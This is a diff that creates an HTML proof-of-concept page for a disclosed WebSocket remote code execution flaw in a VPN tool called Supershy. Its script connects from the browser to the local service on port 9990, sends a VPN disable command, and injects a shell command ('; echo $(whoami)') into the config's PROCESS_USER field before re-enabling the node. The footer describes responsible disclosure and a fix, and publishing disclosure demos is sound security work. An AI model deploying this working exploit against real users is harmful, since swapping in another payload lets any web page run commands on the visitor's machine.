@@ -1,10 +1,153 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>$Title$</title>
+    <meta charset="UTF-8">
+    <title>Supershy WebSocket RCE PoC</title>
+    <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.2/dist/socket.io.min.js"></script>
+    <style>
+        body {
+            font-family: monospace;
+            background: #f9f9f9;
+            color: #222;
+            padding: 50px 20px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+
+        p.subtext {
+            color: #666;
+            font-size: 14px;
+            margin-top: 0;
+            margin-bottom: 30px;
+        }
+
+        img {
+            max-width: 250px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            margin: 20px auto;
+            display: block;
+        }
+
+        .buttons {
+            margin: 30px 0;
+        }
+
+        button {
+            background: #0077cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:hover {
+            background: #005fa3;
+        }
+
+        pre {
+            background: #fff;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            white-space: pre-wrap;
+            text-align: left;
+            max-width: 800px;
+            margin: 30px auto;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+        }
+
+        .footer {
+            font-size: 13px;
+            color: #555;
+            margin-top: 40px;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #0077cc;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-$END$
+<h1>WebSocket RCE Demo</h1>
+<p class="subtext">Tested locally against the vulnerable version of Supershy.</p>
+
+<img src="https://i.imgur.com/bVDgicu.gif" alt="Seal">
+
+<div class="buttons">
+    <button onclick="sendDisconnect()">Disconnect VPN</button>
+    <button onclick="sendRCE()">Trigger RCE</button>
+</div>
+
+<pre id="log">Connecting...</pre>
+
+<div class="footer">
+    This is a PoC for a vulnerability reported through responsible disclosure.<br>
+    It was fixed quickly by the Supershy dev. This page is here for demo and educational purposes.<br>
+    More info: <a href="https://elliott.diy/blog/supershy" target="_blank">elliott.diy</a> • <a href="https://github.com/elliott-diy" target="_blank">GitHub</a>
+</div>
+
+<script>
+    const log = document.getElementById("log");
+    const print = (msg) => {
+        console.log(msg);
+        log.textContent += (log.textContent ? "\n" : "") + msg;
+    };
+
+    function sendDisconnect() {
+        print("Connecting to WebSocket for VPN disconnect...");
+        const socket = io("http://localhost:9990");
+
+        socket.on("connect", () => {
+            print("Connected. Sending /node/disable...");
+            socket.emit("/node/disable");
+            socket.disconnect();
+        });
+
+        socket.on("disconnect", () => {
+            print("WebSocket disconnected.");
+        });
+    }
+
+    function sendRCE() {
+        print("Connecting to WebSocket for RCE...");
+        const socket = io("http://localhost:9990");
+
+        socket.on("connect", () => {
+            print("Connected. Requesting /config...");
+            socket.emit("/config");
+        });
+
+        socket.once("/config", (config) => {
+            print("Received config.");
+            config.PROCESS_USER += "; echo $(whoami) > /tmp/rce_user.txt";
+            print("Sending modified config...");
+            socket.emit("/config/save", config);
+
+            setTimeout(() => {
+                print("Re-enabling node...");
+                socket.emit("/node/enable");
+                socket.disconnect();
+            }, 5000);
+        });
+
+        socket.on("disconnect", () => {
+            print("WebSocket disconnected.");
+        });
+    }
+</script>
 </body>
 </html>
